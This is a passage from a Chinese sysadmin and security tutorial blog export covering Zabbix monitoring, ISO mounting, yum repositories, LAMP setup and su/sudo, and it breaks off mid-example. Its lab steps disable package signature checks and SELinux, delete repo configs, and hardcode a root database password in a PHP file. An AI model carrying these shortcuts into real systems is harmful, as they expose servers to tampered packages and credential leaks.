src="/../img/img_artical/net_sec/11.2.9.png" alt="11.2.9"></p><h3 id="添加被控机"><a href="#添加被控机" class="headerlink" title="添加被控机"></a>添加被控机</h3><p><strong>Zabbix导航边栏  &#x3D;&gt;  监测  &#x3D;&gt;  主机  &#x3D;&gt;  创建主机</strong></p><p><img src="/../img/img_artical/net_sec/11.2.10.png" alt="11.2.10"></p><h3 id="管理被控机"><a href="#管理被控机" class="headerlink" title="管理被控机"></a>管理被控机</h3><p><strong>Zabbix导航边栏  &#x3D;&gt;  配置  &#x3D;&gt;  主机</strong></p><ul><li>可添加新的被控机：指定主机名、可见名、agent接口地址</li><li>可管理现有被控机：停用&#x2F;启用、修改、选监控模板</li></ul><h3 id="设置监控项"><a href="#设置监控项" class="headerlink" title="设置监控项"></a>设置监控项</h3><p><strong>单击被控主机右侧的“监控项”，可以管理监控项</strong></p><ul><li>关联了OS Linux模板时，会自动添加大量监控项</li><li>比如针对CPU、内存、登录用户数、运行任务数等指标的监控</li></ul><p><img src="/../img/img_artical/net_sec/11.2.11.png" alt="11.2.11"></p><p><strong>zabbix自动发现，或管理员手动添加新监控项</strong></p><ul><li>网卡入站流量  net.if.in[ens160]</li><li>网卡出站流量  net.if.out[ens160]</li></ul><p><img src="/../img/img_artical/net_sec/11.2.12.png" alt="11.2.12"></p><h2 id="监控结果分析"><a href="#监控结果分析" class="headerlink" title="监控结果分析"></a>监控结果分析</h2><h3 id="使用仪表盘"><a href="#使用仪表盘" class="headerlink" title="使用仪表盘"></a>使用仪表盘</h3><p><strong>监测  &#x3D;&gt;  仪表盘，用于集中展现监控指标、报告问题</strong></p><ul><li>仪表板展示的数据块可以编辑</li></ul><p><img src="/../img/img_artical/net_sec/11.2.13.png" alt="11.2.13"></p><h3 id="查看监控图形"><a href="#查看监控图形" class="headerlink" title="查看监控图形"></a>查看监控图形</h3><p><strong>监测  &#x3D;&gt;  主机  &#x3D;&gt;  xx  &#x3D;&gt;  图形，查看主机的监控结果</strong></p><ul><li>默认情况下，zabbix所绘制图形中的汉字会显示为方框，需要修正绘图所使用的字体</li></ul><p><img src="/../img/img_artical/net_sec/11.2.14.png" alt="11.2.14"></p><ul><li>修复中文显示</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# yum -y install wqy-zenhei-fonts               //安装中文字体</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@zbx</span> <span class="string">~]# cp /usr/share/fonts/wqy-zenhei/wqy-zenhei.ttc /usr/share/zabbix/assets/fonts/graphfont.ttf   //替换掉默认字体</span></span><br><span class="line"><span class="attr">cp：是否覆盖&#x27;/usr/share/zabbix/assets/fonts/graphfont.ttf&#x27;？</span> <span class="string">y   </span></span><br></pre></td></tr></table></figure><h3 id="创建监控图形"><a href="#创建监控图形" class="headerlink" title="创建监控图形"></a>创建监控图形</h3><p><strong>配置  &#x3D;&gt;  主机  &#x3D;&gt;  xx  &#x3D;&gt;  图形  &#x3D;&gt;  创建图表</strong></p><ul><li>比如“网卡流量分析”图，整合入站&#x2F;出站流量监控项</li></ul><p><img src="/../img/img_artical/net_sec/11.2.15.png" alt="11.2.15"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全防御1</title>
      <link href="/posts/secdef1.html"/>
      <url>/posts/secdef1.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全防御"><a href="#网络安全防御" class="headerlink" title="网络安全防御"></a>网络安全防御</h1><h2 id="访问存储设备"><a href="#访问存储设备" class="headerlink" title="访问存储设备"></a>访问存储设备</h2><h3 id="什么是挂载"><a href="#什么是挂载" class="headerlink" title="什么是挂载"></a>什么是挂载</h3><p><strong>挂载，装载</strong></p><ul><li>将光盘&#x2F;U盘&#x2F;分区&#x2F;网络存储等设备装到某个Linux目录</li><li>通过访问这个目录来操作设备上的文档</li></ul><p><img src="/../img/img_artical/net_sec/11.1.1.png" alt="11.1.1"></p><h3 id="挂载设备"><a href="#挂载设备" class="headerlink" title="挂载设备"></a>挂载设备</h3><p><strong>关于分区&#x2F;U盘&#x2F;光盘设备文件</strong></p><ul><li><p>分区，一般是&#x2F;dev&#x2F;sda1、&#x2F;dev&#x2F;sda2等等</p></li><li><p>U盘，一般是&#x2F;dev&#x2F;sdb1</p></li><li><p>光盘，一般是&#x2F;dev&#x2F;cdrom，指向&#x2F;dev&#x2F;sr0等设备</p></li><li><p>示例：挂载openEuler光盘</p><ul><li>插入openEuler光盘（虚拟机连ISO文件）</li><li>准备挂载点</li><li>挂载光盘（mount）</li></ul></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mkdir /mnt/dvd               //创建目录（挂载点）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mount /dev/cdrom /mnt/dvd/   //进行挂载</span></span><br></pre></td></tr></table></figure><h3 id="访问设备内的文档"><a href="#访问设备内的文档" class="headerlink" title="访问设备内的文档"></a>访问设备内的文档</h3><p><strong>挂载成功后，通过挂载点即可访问光盘内文档</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /mnt/dvd/              //列出光盘目录内容</span></span><br><span class="line"><span class="attr">docs</span>  <span class="string">EFI  images  isolinux  ks  Packages  repodata  RPM-GPG-KEY-openEuler  TRANS.TBL</span></span><br></pre></td></tr></table></figure><h3 id="卸载设备"><a href="#卸载设备" class="headerlink" title="卸载设备"></a>卸载设备</h3><p><strong>卸载已挂载的openEuler光盘</strong></p><ul><li>卸载完毕后，挂载点与对应设备无任何关系</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# umount /mnt/dvd        //卸载设备</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /mnt/dvd/           //挂载点已为空</span></span><br></pre></td></tr></table></figure><h3 id="认识-etc-fstab配置"><a href="#认识-etc-fstab配置" class="headerlink" title="认识&#x2F;etc&#x2F;fstab配置"></a>认识&#x2F;etc&#x2F;fstab配置</h3><p><strong>开机挂载解析</strong></p><ul><li>在&#x2F;etc&#x2F;fstab文件中添加设备记录</li><li>文件系统类型：iso9660、xfs、swap、ext4</li></ul><p><img src="/../img/img_artical/net_sec/11.1.2.png" alt="11.1.2"></p><h3 id="配置开机挂载"><a href="#配置开机挂载" class="headerlink" title="配置开机挂载"></a>配置开机挂载</h3><p><strong>建挂载点  –&gt;  配置stab  –&gt;  检查配置  –&gt;  重启验证</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mkdir -p /repos/openEuler         //创建自动挂载点</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# vim /etc/fstab                    //编辑开机自动挂载配置</span></span><br><span class="line"></span><br><span class="line"><span class="attr">/dev/cdrom</span> <span class="string">/repos/openEuler iso9660 ro 0 0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mount -a                          //检查开机挂载配置（无报错）</span></span><br></pre></td></tr></table></figure><p><strong>重启系统，检查开机挂载效果</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# reboot</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /repos/openEuler/</span></span><br><span class="line"><span class="attr">docs</span>  <span class="string">images    ks        repodata               TRANS.TBL</span></span><br><span class="line"><span class="attr">EFI</span>   <span class="string">isolinux  Packages  RPM-GPG-KEY-openEuler</span></span><br></pre></td></tr></table></figure><h2 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h2><h3 id="yum工作机制"><a href="#yum工作机制" class="headerlink" title="yum工作机制"></a>yum工作机制</h3><p><strong>YUM，Yellowdog Updater Modified，黄狗升级器</strong></p><ul><li>软件仓库：集中分发.rpm 软件包资源，并解决软件之间的依赖关系</li><li>客户机：使用yum或dnf 查询&#x2F;安装&#x2F;卸载软件</li></ul><p><img src="/../img/img_artical/net_sec/11.1.3.png" alt="11.1.3"></p><h3 id="软件仓库提供方式"><a href="#软件仓库提供方式" class="headerlink" title="软件仓库提供方式"></a>软件仓库提供方式</h3><p><strong>软件资源哪里来</strong></p><p><img src="/../img/img_artical/net_sec/11.1.4.png" alt="11.1.4"></p><h3 id="准备软件仓库目录"><a href="#准备软件仓库目录" class="headerlink" title="准备软件仓库目录"></a>准备软件仓库目录</h3><p><strong>openEuler安装盘已预先配置成软件仓库，可以直接使用</strong></p><ul><li>比如，已挂载了openEuler光盘的&#x2F;repos&#x2F;openEuler目录</li></ul><p><img src="/../img/img_artical/net_sec/11.1.5.png" alt="11.1.5"></p><h3 id="禁用无效源"><a href="#禁用无效源" class="headerlink" title="禁用无效源"></a>禁用无效源</h3><p><strong>对于用不到&#x2F;不能用的源（比如官方源），可以直接删除</strong></p><ul><li>配置位置: &#x2F;etc&#x2F;yum.repos.d&#x2F;*.repo</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# rm -rf /etc/yum.repos.d/*               //删除所有旧的软件源</span></span><br></pre></td></tr></table></figure><h3 id="设置有效源"><a href="#设置有效源" class="headerlink" title="设置有效源"></a>设置有效源</h3><p><strong>通过辅助配置工具快速设置指定的软件源</strong></p><ul><li>用法：yum-config-manager –add-repo  软件源URL地址</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum-config-manager --add https://mirrors.aliyun.com/centos-stream/9-stream/BaseOS/x86_64/os</span></span><br><span class="line"><span class="attr">//阿里的基础软件源</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum-config-manager --add https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/x86_64/os</span></span><br><span class="line"><span class="attr">//阿里的应用软件源</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /etc/yum.repos.d/      //确认结果配置</span></span><br></pre></td></tr></table></figure><h3 id="关闭软件来源检查"><a href="#关闭软件来源检查" class="headerlink" title="关闭软件来源检查"></a>关闭软件来源检查</h3><p><strong>系统对软件来源合法性的检查</strong></p><ul><li>默认只建议安装官方来源的应用软件</li><li>但是需要提供发布者的秘钥</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# vim /etc/yum.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[main]</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="string">0           //将1改为0可以关闭检查</span></span><br></pre></td></tr></table></figure><h3 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h3><p><strong>重新获取源数据，确保有可用仓库</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum repolist -v       //检查仓库列表</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">Total</span> <span class="string">packages: 20,176            //软件源，显示提供包的数量</span></span><br></pre></td></tr></table></figure><h2 id="使用yum管理软件"><a href="#使用yum管理软件" class="headerlink" title="使用yum管理软件"></a>使用yum管理软件</h2><h3 id="list列出软件"><a href="#list列出软件" class="headerlink" title="list列出软件"></a>list列出软件</h3><p><strong>用来获知xx软件是否已安装&#x2F;版本&#x2F;来源</strong></p><ul><li>格式：yum list[软件名]</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum list httpd</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Available</span> <span class="string">Packages</span></span><br><span class="line"><span class="attr">httpd.x86_64</span>      <span class="string">2.4.57-5.el9      mirrors.aliyun.com_centos-stream_9-stream_AppStream_x86_64_os</span></span><br></pre></td></tr></table></figure><h3 id="install-安装软件"><a href="#install-安装软件" class="headerlink" title="install 安装软件"></a>install 安装软件</h3><p><strong>安装软件</strong></p><ul><li>格式：yum [-y] install  软件名|文件名</li><li>软件名（yum仓库），文件名（离线安装包）</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum -y install httpd</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Installing</span>:<span class="string"></span></span><br><span class="line"> <span class="attr">httpd</span> <span class="string">x86_64 2.4.57-5.el9   mirrors.aliyun.com_centos-stream_9-stream_AppStream_x86_64_os  47 k</span></span><br></pre></td></tr></table></figure><h3 id="remove-卸载软件"><a href="#remove-卸载软件" class="headerlink" title="remove 卸载软件"></a>remove 卸载软件</h3><p><strong>卸载软件</strong></p><ul><li>格式：yum [-y] remove 软件名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum -y remove httpd</span></span><br></pre></td></tr></table></figure><h2 id="LAMP部署及测试"><a href="#LAMP部署及测试" class="headerlink" title="LAMP部署及测试"></a>LAMP部署及测试</h2><h3 id="B-S服务架构"><a href="#B-S服务架构" class="headerlink" title="B&#x2F;S服务架构"></a>B&#x2F;S服务架构</h3><p><strong>基于Browser&#x2F;Server架构的网页资源通信</strong></p><ul><li>服务端：支持HTTP协议的网页提供程序</li><li>浏览器&#x2F;客户端：下载并按标记规范显示网页的浏览器程序</li></ul><p><img src="/../img/img_artical/net_sec/11.1.6.png" alt="11.1.6"></p><h3 id="如何获取网站资源"><a href="#如何获取网站资源" class="headerlink" title="如何获取网站资源"></a>如何获取网站资源</h3><p><strong>URL网址</strong></p><ul><li>Uniform Resource Locator，统一资源定位器</li><li>资源类别：&#x2F;&#x2F;服务器地址&#x2F;目录路径&#x2F;文件名</li></ul><h3 id="静态网站与动态网站"><a href="#静态网站与动态网站" class="headerlink" title="静态网站与动态网站"></a>静态网站与动态网站</h3><p><strong>静态网站（只读）</strong></p><ul><li>访问同一个网址时，看到的网页资源是固定不变的</li><li>比如index.html、.txt、 .targz、 .png、 .jpg、.gif</li></ul><p><strong>动态网站（可交互）</strong></p><ul><li>访问同一个网址(网页程序) 时，看到的网页资源是变化的…..</li><li>比如.php、.jsp、.wsgi 、.asp、</li></ul><h3 id="什么是LAMP"><a href="#什么是LAMP" class="headerlink" title="什么是LAMP"></a>什么是LAMP</h3><p><strong>一种成熟的动态企业网站服务器模式</strong></p><ul><li>Apache在最前端，负责处理来自浏览器的Web访问请求</li></ul><p><img src="/../img/img_artical/net_sec/11.1.7.png" alt="11.1.7"></p><h3 id="快速安装LAMP平台"><a href="#快速安装LAMP平台" class="headerlink" title="快速安装LAMP平台"></a>快速安装LAMP平台</h3><p><strong>离线安装</strong></p><ul><li>预先准备离线素材，上传到&#x2F;root&#x2F;目录下</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum -y remove openEuler-logos            //卸载冲突包</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# ls /root/lamp80/                         //查看是否上传成功</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum -y install /root/lamp80/*.rmp        //安装</span></span><br></pre></td></tr></table></figure><ul><li>确认安装结果，不要有遗漏</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# yum list httpd mariadb-server php-fpm php-mysqlnd</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Installed</span> <span class="string">Packages          //已安装的软件包</span></span><br><span class="line"><span class="attr">httpd.x86_64</span>                     <span class="string">2.4.53-7.el9                  @@commandline</span></span><br><span class="line"><span class="attr">mariadb-server.x86_64</span>            <span class="string">3:10.5.16-2.el9               @@commandline</span></span><br><span class="line"><span class="attr">php-fpm.x86_64</span>                   <span class="string">8.0.20-3.el9                  @@commandline</span></span><br><span class="line"><span class="attr">php-mysqlnd.x86_64</span>               <span class="string">8.0.20-3.el9                  @@commandline</span></span><br></pre></td></tr></table></figure><h3 id="启动LAMP平台"><a href="#启动LAMP平台" class="headerlink" title="启动LAMP平台"></a>启动LAMP平台</h3><p><strong>openEuler中默认提供三个服务</strong></p><ul><li>httpd网站</li><li>mariadb数据库</li><li>php-fpm编程语言</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl  enable --now httpd mariadb php-fpm</span></span><br><span class="line"><span class="attr">//设置服务开机自启</span></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# setenforce 0</span></span><br><span class="line"><span class="attr">//关闭SELinux</span></span><br></pre></td></tr></table></figure><ul><li>允许80端口通过防火墙</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# firewall-cmd --zone=public --add-port=80/tcp --permanent      //允许TCP80端口通过防火墙</span></span><br><span class="line"><span class="attr">success</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# systemctl restart firewalld            //重启防火墙</span></span><br></pre></td></tr></table></figure><p><strong>从浏览器访问</strong></p><ul><li>http:&#x2F;&#x2F;虚拟机的IP地址&#x2F;</li></ul><p><img src="/../img/img_artical/net_sec/11.1.8.png" alt="11.1.8"></p><h3 id="检查PHP环境"><a href="#检查PHP环境" class="headerlink" title="检查PHP环境"></a>检查PHP环境</h3><p><strong>在网站根目录下创建PHP环境测试文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /<span class="keyword">var</span>/www/html/t1.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();            <span class="comment">//显示PHP版本等信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="检查PHP网页访问数据库"><a href="#检查PHP网页访问数据库" class="headerlink" title="检查PHP网页访问数据库"></a>检查PHP网页访问数据库</h3><p><strong>在网站根目录下建立数据库测试文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ntd ~]<span class="comment"># mysqladmin -uroot password &#x27;db@1234&#x27;</span></span><br><span class="line">[root@ntd ~]<span class="comment"># vim /var/www/html/t2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$mysqli</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;db@1234&#x27;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;连接数据库失败&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;连接数据库成功&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mysql-secure-installation安全加固"><a href="#mysql-secure-installation安全加固" class="headerlink" title="mysql_secure_installation安全加固"></a>mysql_secure_installation安全加固</h3><p><strong>默认设置很方便，也很不安全</strong></p><ul><li>需要为MariaDB&#x2F;MySQL的test库、空密码等默认设置填坑(除密码设置外，一路回车)</li><li>注意：生产环境建议运行此脚本，并仔细完成所有安全优化操作</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# mysql_secure_installation</span></span><br></pre></td></tr></table></figure><h3 id="做快照"><a href="#做快照" class="headerlink" title="做快照"></a>做快照</h3><p><strong>做快照，记录LAMP状态</strong></p><p><img src="/../img/img_artical/net_sec/11.1.9.png" alt="11.1.9"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全防御 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Linux渗透测试5</title>
      <link href="/posts/lnxpte5.html"/>
      <url>/posts/lnxpte5.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux渗透测试"><a href="#Linux渗透测试" class="headerlink" title="Linux渗透测试"></a>Linux渗透测试</h1><h2 id="su用户切换"><a href="#su用户切换" class="headerlink" title="su用户切换"></a>su用户切换</h2><h3 id="su机制介绍"><a href="#su机制介绍" class="headerlink" title="su机制介绍"></a>su机制介绍</h3><p>su（substitute user）：切换&#x2F;替换用户</p><ul><li>root切换为任何可登录的用户，无需密码</li><li>普通用户切换至其他用户时，需要验证目标用户的密码</li><li>不指定目标用户时，默认切换为root</li></ul><p><img src="/../img/img_artical/net_sec/10.5.1.png" alt="10.5.1"></p><h3 id="su基本用法"><a href="#su基本用法" class="headerlink" title="su基本用法"></a>su基本用法</h3><p><strong>切换到新用户的登录环境</strong></p><ul><li>执行su - 用户名 进入新的用户环境</li><li>执行exit返回原来的用户</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# su - student        //切换为student，其中 - 表示登录</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[student@ntd</span> <span class="string">~]$ pwd              //以student身份执行任务</span></span><br><span class="line"><span class="attr">/home/student</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[student@ntd</span> <span class="string">~]$ exit             //退出切换环境</span></span><br><span class="line"><span class="attr">注销</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]#                     //已返回到原来的环境</span></span><br></pre></td></tr></table></figure><h3 id="禁止滥用su切换权限"><a href="#禁止滥用su切换权限" class="headerlink" title="禁止滥用su切换权限"></a>禁止滥用su切换权限</h3><p><strong>通常情况下，任何用户都被允许使用su 切换</strong></p><p><strong>但openEuler中启用了wheel组限制</strong></p><ul><li>除了root以外，只有加入wheel组的用户才被允许使用su</li><li>切换其他人使用su切换时，会提示拒绝权限</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# useradd student            //创建student用户</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# passwd student             //为student设置密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# su - student               //从root切换到student（允许）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[student@ntd</span> <span class="string">~]$ su - root               //从student切换到root（拒绝）</span></span><br><span class="line"><span class="attr">密码：</span></span><br><span class="line"><span class="attr">su</span>: <span class="string">拒绝权限</span></span><br></pre></td></tr></table></figure><h3 id="使用su切换"><a href="#使用su切换" class="headerlink" title="使用su切换"></a>使用su切换</h3><ul><li>将用户添加到wheel组中</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# gpasswd -a student wheel        //将student用户加入到wheel组</span></span><br><span class="line"><span class="attr">正在将用户“student”加入到“wheel”组中</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# su - student                    //切换到student用户</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[student@ntd</span> <span class="string">~]$ su - root                    //从student切换到root用户</span></span><br></pre></td></tr></table></figure><ul><li>取消wheel组限制（注释配置项使其失效）</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# vi /etc/pam.d/su</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#auth           required        pam_wheel.so use_uid</span></span><br></pre></td></tr></table></figure><h3 id="su操作日志"><a href="#su操作日志" class="headerlink" title="su操作日志"></a>su操作日志</h3><p><strong>安全日志&#x2F;var&#x2F;log&#x2F;secure文件</strong></p><ul><li>记录了用户登录、切换相关的事件信息</li><li>查找su-l关键词（&#x2F;su-l），可以找到与使用su切换用户相关的消息</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# less /var/log/secure</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Jan</span>  <span class="string">4 14:50:59 ntd su[2075]: pam_unix(su-l:session): session opened for user student(uid=1001) by root(uid=0)</span></span><br><span class="line"><span class="attr">Jan</span>  <span class="string">4 14:51:08 ntd su[2147]: pam_unix(su-l:session): session opened for user root(uid=0) by root(uid=1001)</span></span><br></pre></td></tr></table></figure><h2 id="sudo命令提权"><a href="#sudo命令提权" class="headerlink" title="sudo命令提权"></a>sudo命令提权</h2><h3 id="sudo机制介绍"><a href="#sudo机制介绍" class="headerlink" title="sudo机制介绍"></a>sudo机制介绍</h3><p><strong>sudo（super doing）：执行管理员授权的命令</strong></p><ul><li>允许授权用户代替管理员（或其他用户） 来完成预先授权的命令</li><li>授权用户、授权命令需要提前配置</li><li>通过sudo执行命令时，只验证自己的密码 （5分钟内不重复验证）</li></ul><p><img src="/../img/img_artical/net_sec/10.5.2.png" alt="10.5.2"></p><h3 id="配置sudo授权"><a href="#配置sudo授权" class="headerlink" title="配置sudo授权"></a>配置sudo授权</h3><p><strong>使用visudo专用工具</strong></p><ul><li>授权规则：用户名 本机可用主机名列表&#x3D;（用户身份） 授权命令列表</li><li>不指定用户身份时，缺省为root</li><li>指定用户组使用%组名</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[root@ntd</span> <span class="string">~]# visudo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">%wheel</span>  <span class="string">ALL=(ALL)       ALL</span></span><br><span class="line"><span class="attr">zx</span>      <span class="string">ALL=            /usr/bin/nmtui</span></span><br><span class="line"><span class="attr">zy</span>      <span class="string">ALL=            ALL</span></span><br></pre></td></tr></table></figure><h3 id="sudo基本用法"><a href="#sudo基本用法" class="headerlink" title="sudo基本用法"></a>sudo基本用法</h3><p><strong>sudo -l：查看自己的sudo授权</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 